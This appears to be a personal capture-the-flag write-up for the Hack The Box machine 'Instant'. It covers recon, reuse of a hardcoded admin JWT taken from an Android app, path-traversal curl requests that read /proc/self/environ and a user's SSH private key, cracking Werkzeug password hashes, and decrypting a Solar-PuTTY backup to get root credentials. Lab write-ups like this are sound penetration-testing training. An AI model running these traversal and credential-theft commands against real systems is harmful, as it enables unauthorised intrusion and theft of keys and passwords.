
### Nmap Scan


```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
|_  256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://instant.htb/
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: instant.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


No Vhosts found
No hidden directories


Debugged the api key , found an admin cookie? 
```
new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/view/profile").addHeader("Authorization", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA").build()).enqueue(new Callback() { // from class: com.instantlabs.instant.AdminActivities.1
```

There was a api endpoint , adding the authorization header to the request followed by the cookie we were able to view the page! 

```
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA

```

```
{"Profile":{"account_status":"active","email":"admin@instant.htb","invite_token":"instant_admin_inv","role":"Admin","username":"instantAdmin","wallet_balance":"10000000","wallet_id":"f0eca6e5-783a-471d-9d8f-0162cbc900db"},"Status":200}

```

![](../images/Pasted%20image%2020261016114235.png)

registartion form is expecting post request including  a username , password and pin structure formated in json
we add 
content-type: application/json

```
{

"username:"test",
"password:"123",
"pin"123",
"email":"123@test.com"

}
```
![](../images/Pasted%20image%2020261016120813.png)

account registered, now lets try to login

![](../images/Pasted%20image%2020261016121927.png)

received a auth token
![](../images/Pasted%20image%2020261016122013.png)

made an account
![](../images/Pasted%20image%2020261016122234.png)



```
{ "Status": 200, "Users": [ { "email": "admin@instant.htb", "role": "Admin", "secret_pin": 87348, "status": "active", "username": "instantAdmin", "wallet_id": "f0eca6e5-783a-471d-9d8f-0162cbc900db" }, { "email": "shirohige@instant.htb", "role": "instantian", "secret_pin": 42845, "status": "active", "username": "shirohige", "wallet_id": "458715c9-b15e-467b-8a3d-97bc3fcf3c11" }, { "email": "123@email.com", "role": "instantian", "secret_pin": 12345, "status": "active", "username": "test", "wallet_id": "ce1279f1-a398-4d43-93b3-c5feab61b2b8" } ] }
```

# Foothold

the read file log had a path traversal vulnerability , as a genius as i am i went to 

proc/self/environ showed us that there was a second user called shirohige

then i thought . lets see if this user has any authozired keys so i 

```
../../../home/shirohige/.ssh/authorized_keys
```

and we got a hit, so then our next move was to get the private key


```
../../../../home/shirohige/.ssh/id_rsa
```


our file came in with /n so wee needed to clean it up before we use it , claude gave us this solution

**What the Python script did:** The API returns the key as an array of strings with literal `\n` characters. The script used `json.load()` to parse the JSON properly, joined all array elements, and replaced the escaped `\n` with real newlines — giving you a properly formatted PEM key file.



**What you can see from `/proc/self/environ`:**

- **USER=shirohige** — the web app runs as `shirohige` (not root, not www-data)
- **SYSTEMD_EXEC_PID=1337** — it’s a systemd service
- **swagger-start.service** — the service name (in the memory pressure path)
- **SHELL=/bin/bash** — user has a real shell

```
curl -s -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=../../../../home/shirohige/.ssh/id_rsa" -H "accept: application/json" -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" > /tmp/raw_key.json

```

we saved the key in a /tmp/raw_key.json

```
# Check the structure cat /tmp/raw_key.json | python3 -c " import json, sys data = json.load(sys.stdin) for k,v in data.items(): if k != 'Status': # Join all array elements and fix escaped newlines key_text = ''.join(v).replace('\\n', '\n') print(key_text, end='') " > shirohige_id_rsa
```

```
chmod 600 shirohige_id_rsa cat shirohige_id_rsa
```

### Method2 

The command is mostly the same as before but we will add the following arguments:
-r : (raw output) remove the JSON formatting with the quotes
.[].[] : extract the string from the array inside the JSON object, essentially outputting only the key's value as a continuous string

```
curl http://mywalletv1.instant.htb/api/v1/admin/read/log? log_file_name=../.ssh/id_rsa -H "Authorization:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluI iwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5Mz AzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" | jq -r '.[].[]' > id_rsa
```


A quick Google search of the algorithm and hash type reveals a tool on Github , **WerkzeugCracker,** that can decode hashes of this format which are typically encoded by the werkzeug.security module. We will copy the repo to our machine and then try using the tool on the hashes we found. First, let's put the hashes into files.

https://github.com/AnataarXVI/Werkzeug-Cracker


```
echo 'pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cb b6586fab7ab7bc762bd978' > adminhash.txt
```


```
echo 'pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971 d8a28272c550ed' > shirohigehash.txt
```

create a virtual env
```
python3 -m venv myenv
source myenv/bin/activate
pip install -r requirements.txt
```

then

```
python3 werkzeug_cracker.py -w /usr/share/wordlists/rockyou.txt -p //shirohigehash.txt
```



![](../images/Pasted%20image%2020261016150327.png)


### Priv Esc

- **Found `/opt/backups/Solar-PuTTY/sessions-backup.dat`** — a Solar PuTTY session backup file (encrypted)
- We would need this tool to crack the password https://github.com/VoidSec/SolarPuttyDecrypt
- after we get the tool and we transfer our file to a windows machine we launch the .exe file pointing it to the .dat file appending our password that we found estrella and we get the session information and inside there are the root credentials 

> [!NOTE]
> **Solar PuTTY** is a Windows SSH/Telnet client (by SolarWinds) — like PuTTY but with a nicer UI. Its killer feature is that it **saves sessions with stored credentials** — hostnames, usernames, passwords, and private keys — so you don’t have to type them every time.


![](../images/Screenshot_4.png)


**OSCP takeaway:** Always check `/opt/`, `/backups/`, and home directories for session files, config backups, and credential stores — PuTTY sessions (`.ppk`, `sessions-backup.dat`), WinSCP configs, FileZilla `sitemanager.xml`, `.bash_history`, KeePass databases, etc. Admins love saving credentials for convenience, and those files are often left world-readable.